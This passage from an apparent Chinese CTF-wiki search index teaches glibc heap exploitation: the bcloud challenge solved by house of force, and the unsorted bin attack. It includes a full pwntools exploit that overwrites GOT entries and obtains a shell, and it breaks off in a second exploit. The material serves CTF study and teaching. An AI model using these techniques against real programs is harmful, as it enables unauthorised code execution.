            "text": "\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u4e91\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\u3002\u9996\u5148\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8bbe\u7f6e\u7528\u6237\u7684\u540d\u5b57\uff0c\u7ec4\u7ec7\uff0chost\u3002\u7a0b\u5e8f\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd   \u65b0\u5efanote\uff0c\u6839\u636e\u7528\u6237\u7684\u8f93\u5165x\u7533\u8bf7x+4\u7684\u7a7a\u95f4\u4f5c\u4e3anote\u7684\u5927\u5c0f\u3002  \u5c55\u793anote\uff0c\u5565\u529f\u80fd\u4e5f\u6ca1\u6709\u3002\u3002  \u7f16\u8f91note\uff0c\u6839\u636e\u7528\u6237\u6307\u5b9a\u7684 note \u7f16\u8f91\u5bf9\u5e94\u7684\u5185\u5bb9\u3002  \u5220\u9664note\uff0c\u5220\u9664\u5bf9\u5e94note\u3002  \u540c\u6b65note\uff0c\u6807\u8bb0\u6240\u6709\u7684note\u5df2\u7ecf\u88ab\u540c\u6b65\u3002   \u7136\u800c\u5728\u8fd9\u4e94\u4e2a\u529f\u80fd\u4e2d\u5e76\u6ca1\u6709\u53d1\u73b0\u5565\u6f0f\u6d1e\uff0c\uff0c\uff0c\u91cd\u65b0\u770b\u7a0b\u5e8f\uff0c\u7ed3\u679c\u53d1\u73b0\u7a0b\u5e8f\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6f0f\u6d1e\u3002\u3002  \u521d\u59cb\u5316\u540d\u5b57  unsigned   int   init_name ()  { \n   char   s ;   // [esp+1Ch] [ebp-5Ch] \n   char   * tmp ;   // [esp+5Ch] [ebp-1Ch] \n   unsigned   int   v3 ;   // [esp+6Ch] [ebp-Ch] \n\n   v3   =   __readgsdword ( 0x14u ); \n   memset ( s ,   0 ,   0x50u ); \n   puts ( Input your name: ); \n   read_str ( s ,   64 ,   \\n ); \n   tmp   =   ( char   * ) malloc ( 0x40u ); \n   name   =   tmp ; \n   strcpy ( tmp ,   s ); \n   info ( tmp ); \n   return   __readgsdword ( 0x14u )   ^   v3 ;  }   \u8fd9\u91cc\u5982\u679c\u7a0b\u5e8f\u8bfb\u5165\u7684\u540d\u5b57\u4e3a64\u4e2a\u5b57\u7b26\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u5728\u4f7f\u7528info\u51fd\u6570\u8f93\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u65f6\uff0c\u5c31\u4f1a\u8f93\u51fa\u5bf9\u5e94\u7684tmp\u6307\u9488\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u8bf4 \u6cc4\u9732\u4e86\u5806\u7684\u5730\u5740 \u3002\u3002  \u521d\u59cb\u5316\u7ec4\u7ec7\u548corg\u7684\u65f6\u5019\u5b58\u5728\u6f0f\u6d1e  unsigned   int   init_org_host ()  { \n   char   s ;   // [esp+1Ch] [ebp-9Ch] \n   char   * v2 ;   // [esp+5Ch] [ebp-5Ch] \n   char   v3 ;   // [esp+60h] [ebp-58h] \n   char   * v4 ;   // [esp+A4h] [ebp-14h] \n   unsigned   int   v5 ;   // [esp+ACh] [ebp-Ch] \n\n   v5   =   __readgsdword ( 0x14u ); \n   memset ( s ,   0 ,   0x90u ); \n   puts ( Org: ); \n   read_str ( s ,   64 ,   10 ); \n   puts ( Host: ); \n   read_str ( v3 ,   64 ,   10 ); \n   v4   =   ( char   * ) malloc ( 0x40u ); \n   v2   =   ( char   * ) malloc ( 0x40u ); \n   org   =   v2 ; \n   host   =   v4 ; \n   strcpy ( v4 ,   v3 ); \n   strcpy ( v2 ,   s ); \n   puts ( OKay! Enjoy:) ); \n   return   __readgsdword ( 0x14u )   ^   v5 ;  }   \u5f53\u8bfb\u5165\u7ec4\u7ec7\u65f6\uff0c\u7ed9\u5b9a 64 \u5b57\u8282\uff0c\u4f1a\u8986\u76d6 v2 \u7684\u4f4e\u5730\u5740\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 v2 \u662f\u4e0e top chunk \u76f8\u90bb\u7684 chunk\uff0c\u800c v2 \u6070\u597d\u4e0e org \u76f8\u90bb\uff0c\u90a3\u4e48\u7531\u4e8e\u5728 32 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u822c\u90fd\u662f 32 \u4f4d\u5168\u90e8\u90fd\u4f7f\u7528\uff0c\u8fd9\u91cc v2 \u6240\u5b58\u50a8\u7684\u5185\u5bb9\uff0c\u51e0\u4e4e\u5f88\u5927\u7a0b\u5ea6\u4e0a\u90fd\u4e0d\u662f  \\x00  \uff0c\u6240\u4ee5\u5f53\u6267\u884c strcpy \u51fd\u6570\u5411 v2 \u4e2d\u62f7\u8d1d\u5185\u5bb9\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u8986\u76d6top chunk\u3002\u8fd9\u5c31\u662f\u6f0f\u6d1e\u6240\u5728\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_9", 
            "text": "\u5229\u7528\u521d\u59cb\u5316\u540d\u5b57\u5904\u7684\u6f0f\u6d1e\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\u3002\u3002  \u5229\u7528 house of force \u5c06 top chunk \u5206\u914d\u81f3\u5168\u5c40\u7684 0x0804B0A0 \u7684  notesize-8 \u5904\uff0c\u5f53\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u4fbf\u8fd4\u56denotesize\u5730\u5740\u5904\u7684\u5185\u5b58\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6240\u6709note\u7684\u5927\u5c0f\u4ee5\u53ca\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002  \u4fee\u6539\u524d\u4e09\u4e2a note \u7684\u5927\u5c0f\u4e3a16\uff0c\u5e76\u4fee\u6539\u5176\u6307\u9488\u4e3a free@got\uff0catoi@got\uff0catoi@got  \u5c06 free@got \u4fee\u6539\u4e3a puts@plt\u3002  \u6cc4\u6f0f atoi \u5730\u5740\u3002  \u518d\u6b21\u4fee\u6539\u53e6\u5916\u4e00\u4e2a atoi got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u62ff\u5230shell\u3002   \u5177\u4f53\u811a\u672c\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./bcloud  bcloud   =   ELF ( ./bcloud )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 )  else : \n     p   =   process ( ./bcloud )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  def   offset_bin_main_arena ( idx ): \n     word_bytes   =   context . word_size   /   8 \n     offset   =   4    # lock \n     offset   +=   4    # flags \n     offset   +=   word_bytes   *   10    # offset fastbin \n     offset   +=   word_bytes   *   2    # top,last_remainder \n     offset   +=   idx   *   2   *   word_bytes    # idx \n     offset   -=   word_bytes   *   2    # bin overlap \n     return   offset  def   exp (): \n     # leak heap base \n     p . sendafter ( Input your name: \\n ,   a   *   64 ) \n     p . recvuntil ( Hey    +   a   *   64 ) \n     # sub name s chunk  s header \n     heap_base   =   u32 ( p . recv ( 4 ))   -   8 \n     log . success ( heap_base:    +   hex ( heap_base )) \n     p . sendafter ( Org: \\n ,   a   *   64 ) \n     p . sendlineafter ( Host: \\n ,   p32 ( 0xffffffff )) \n     # name,org,host, for each is (0x40+8) \n     topchunk_addr   =   heap_base   +   ( 0x40   +   8 )   *   3 \n\n     # make topchunk point to 0x0804B0A0-8 \n     p . sendlineafter ( option--- ,   1 ) \n     notesize_addr   =   0x0804B0A0 \n     notelist_addr   =   0x0804B120 \n     targetaddr   =   notesize_addr   -   8 \n     offset_target_top   =   targetaddr   -   topchunk_addr \n     # 4 for size_t, 7 for malloc_allign \n     malloc_size   =   offset_target_top   -   4   -   7 \n     # plus 4 because malloc(v2 + 4); \n     p . sendlineafter ( Input the length of the note content: \\n , \n                     str ( malloc_size   -   4 )) \n     # most likely malloc_size-4 0... \n     if   malloc_size   -   4     0 : \n         p . sendlineafter ( Input the content: \\n ,   ) \n\n     #gdb.attach(p) \n     # set notesize[0] = notesize[1] = notesize[2]=16 \n     # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got \n     p . sendlineafter ( option--- ,   1 ) \n     p . sendlineafter ( Input the length of the note content: \\n ,   str ( 1000 )) \n\n     payload   =   p32 ( 16 )   *   3   +   ( notelist_addr   -   notesize_addr   -   12 )   *   a   +   p32 ( \n         bcloud . got [ free ])   +   p32 ( bcloud . got [ atoi ])   *   2 \n     p . sendlineafter ( Input the content: \\n ,   payload ) \n\n     # overwrite free@got with puts@plt \n     p . sendlineafter ( option--- ,   3 ) \n     p . sendlineafter ( Input the id: \\n ,   str ( 0 )) \n     p . sendlineafter ( Input the new content: \\n ,   p32 ( bcloud . plt [ puts ])) \n\n     # leak atoi addr by fake free \n     p . sendlineafter ( option--- ,   4 ) \n     p . sendlineafter ( Input the id: \\n ,   str ( 1 )) \n     atoi_addr   =   u32 ( p . recv ( 4 )) \n     libc_base   =   atoi_addr   -   libc . symbols [ atoi ] \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     log . success ( libc base addr:    +   hex ( libc_base )) \n\n     # overwrite atoi@got with system \n     p . sendlineafter ( option--- ,   3 ) \n     p . sendlineafter ( Input the id: \\n ,   str ( 2 )) \n     p . sendlineafter ( Input the new content: \\n ,   p32 ( system_addr )) \n\n     # get shell \n     p . sendlineafter ( option--- ,   /bin/sh \\x00 ) \n     p . interactive ()  if   __name__   ==   __main__ : \n     exp ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_10", 
            "text": "2016 Boston Key Party CTF cookbook", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/", 
            "text": "Unsorted Bin Attack\n\n\n\u6982\u8ff0\n\n\nUnsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002\n\n\nUnsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002\n\n\nUnsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002\n\n\nUnsorted Bin \u56de\u987e\n\n\n\u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002\n\n\n\u57fa\u672c\u6765\u6e90\n\n\n\n\n\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002\n\n\n\u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8etop chunk\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002\n\n\n\u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin \u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002\n\n\n\n\n\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\n\n\n\n\nUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c\n\u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6\n\u3002\n\n\n\u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002\n\n\n\n\n\u539f\u7406\n\n\n\u8fd9\u91cc\u6211\u4ee5 shellfish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684 \nunsorted_bin_attack.c\n \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n\nint\n \nmain\n()\n \n{\n\n  \nfprintf\n(\nstderr\n,\n \nThis file demonstrates unsorted bin attack by write a large \n\n                  \nunsigned long value into stack\n\\n\n);\n\n  \nfprintf\n(\n\n      \nstderr\n,\n\n      \nIn practice, unsorted bin attack is generally prepared for further \n\n      \nattacks, such as rewriting the \n\n      \nglobal variable global_max_fast in libc for further fastbin attack\n\\n\\n\n);\n\n\n  \nunsigned\n \nlong\n \ntarget_var\n \n=\n \n0\n;\n\n  \nfprintf\n(\nstderr\n,\n\n          \nLet\ns first look at the target we want to rewrite on stack:\n\\n\n);\n\n  \nfprintf\n(\nstderr\n,\n \n%p: %ld\n\\n\\n\n,\n \ntarget_var\n,\n \ntarget_var\n);\n\n\n  \nunsigned\n \nlong\n \n*\np\n \n=\n \nmalloc\n(\n400\n);\n\n  \nfprintf\n(\nstderr\n,\n \nNow, we allocate first normal chunk on the heap at: %p\n\\n\n,\n\n          \np\n);\n\n  \nfprintf\n(\nstderr\n,\n \nAnd allocate another normal chunk in order to avoid \n\n                  \nconsolidating the top chunk with\n\n                  \nthe first one during the free()\n\\n\\n\n);\n\n  \nmalloc\n(\n500\n);\n\n\n  \nfree\n(\np\n);\n\n  \nfprintf\n(\nstderr\n,\n \nWe free the first chunk now and it will be inserted in the \n\n                  \nunsorted bin with its bk pointer \n\n                  \npoint to %p\n\\n\n,\n\n          \n(\nvoid\n \n*\n)\np\n[\n1\n]);\n\n\n  \n/*------------VULNERABILITY-----------*/\n\n\n  \np\n[\n1\n]\n \n=\n \n(\nunsigned\n \nlong\n)(\ntarget_var\n \n-\n \n2\n);\n\n  \nfprintf\n(\nstderr\n,\n \nNow emulating a vulnerability that can overwrite the \n\n                  \nvictim-\nbk pointer\n\\n\n);\n\n  \nfprintf\n(\nstderr\n,\n \nAnd we write it with the target address-16 (in 32-bits \n\n                  \nmachine, it should be target address-8):%p\n\\n\\n\n,\n\n          \n(\nvoid\n \n*\n)\np\n[\n1\n]);\n\n\n  \n//------------------------------------\n\n\n  \nmalloc\n(\n400\n);\n\n  \nfprintf\n(\nstderr\n,\n \nLet\ns malloc again to get the chunk we just free. During \n\n                  \nthis time, target should has already been \n\n                  \nrewrite:\n\\n\n);\n\n  \nfprintf\n(\nstderr\n,\n \n%p: %p\n\\n\n,\n \ntarget_var\n,\n \n(\nvoid\n \n*\n)\ntarget_var\n);\n\n\n}\n\n\n\n\n\n\u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a\n\n\n\u279c  unsorted_bin_attack git:\n(\nmaster\n)\n \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack   \n\u279c  unsorted_bin_attack git:\n(\nmaster\n)\n \u2717 ./unsorted_bin_attack\nThis file demonstrates unsorted bin attack by write a large unsigned long value into stack\nIn practice, unsorted bin attack is generally prepared \nfor\n further attacks, such as rewriting the global variable global_max_fast in libc \nfor\n further fastbin attack\n\nLet\ns first look at the target we want to rewrite on stack:\n\n\n0x7ffe0d232518: 0\n\n\n\nNow, we allocate first normal chunk on the heap at: 0x1fce010\n\n\nAnd allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()\n\n\n\nWe free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\n\n\nNow emulating a vulnerability that can overwrite the victim-\nbk pointer\n\n\nAnd we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508\n\n\n\nLet\ns malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002\n\n\n\n\n\u521d\u59cb\u72b6\u6001\u65f6\n\n\nunsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002\n\n\n\u6267\u884cfree(p)\n \n\n\n\u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\n\n\n\u4fee\u6539p[1]\n\n\n\u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002\n\n\n\u7533\u8bf7400\u5927\u5c0f\u7684chunk\n\n\n\u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 chunk\uff0c\u6240\u4ee5\u4f1a\u53bbunsorted bin\u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002\n\n\n        \nwhile\n \n((\nvictim\n \n=\n \nunsorted_chunks\n(\nav\n)\n-\nbk\n)\n \n!=\n \nunsorted_chunks\n(\nav\n))\n \n{\n\n            \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n            \nif\n \n(\n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n                \n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n \nav\n-\nsystem_mem\n,\n \n0\n))\n\n                \nmalloc_printerr\n(\ncheck_action\n,\n \nmalloc(): memory corruption\n,\n\n                                \nchunk2mem\n(\nvictim\n),\n \nav\n);\n\n            \nsize\n \n=\n \nchunksize\n(\nvictim\n);\n\n\n            \n/*\n\n\n               If a small request, try to use last remainder if it is the\n\n\n               only chunk in unsorted bin.  This helps promote locality for\n\n\n               runs of consecutive small requests. This is the only\n\n\n               exception to best-fit, and applies only when there is\n\n\n               no exact fit for a small chunk.\n\n\n             */\n\n            \n/* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/\n\n            \nif\n \n(\nin_smallbin_range\n(\nnb\n)\n \n \nbck\n \n==\n \nunsorted_chunks\n(\nav\n)\n \n\n                \nvictim\n \n==\n \nav\n-\nlast_remainder\n \n\n                \n(\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n \n+\n \nMINSIZE\n))\n \n{\n\n                \n....\n\n            \n}\n\n\n            \n/* remove from unsorted list */\n\n            \nunsorted_chunks\n(\nav\n)\n-\nbk\n \n=\n \nbck\n;\n\n            \nbck\n-\nfd\n                 \n=\n \nunsorted_chunks\n(\nav\n);\n\n\n\n\n\n\n\nvictim = unsorted_chunks(av)-\nbk=p\n\n\nbck = victim-\nbk=p-\nbk = target addr-16\n\n\nunsorted_chunks(av)-\nbk = bck=target addr-16\n\n\nbck-\nfd                 = *(target addr -16+16) = unsorted_chunks(av);\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002\n\u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002\n\n\n\u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002\n\n\nWe free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\nNow emulating a vulnerability that can overwrite the victim-\nbk pointer\nAnd we write it with the target address-16 \n(\nin \n32\n-bits machine, it should be target address-8\n)\n:0x7ffe0d232508\n\nLet\ns malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002\n\u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\n\n\n\u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4\n\n\n\n\n\u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002\n\n\n\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack\u4e86\u3002\n\n\n\n\nHITCON Training lab14 magic heap\n\n\n\u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002\n\n\nvoid\n \nl33t\n()\n \n{\n \nsystem\n(\ncat ./flag\n);\n \n}\n\n\n\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  hitcontraining_lab14 git:\n(\nmaster\n)\n file magicheap \nmagicheap: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped\n\u279c  hitcontraining_lab14 git:\n(\nmaster\n)\n checksec magicheap \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u768464\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd\n\n\n\n\n\u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002\n\n\n\u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002\n\n\n\n\n\u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002\n\n\n\u5229\u7528\n\n\n\u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002\n\n\n\n\n\u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002\n\n\n\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a \nmagic-16\u3002\n\n\n\u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\u3002\n\n\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n./magicheap\n)\n\n\n\n\ndef\n \ncreate_heap\n(\nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n1\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    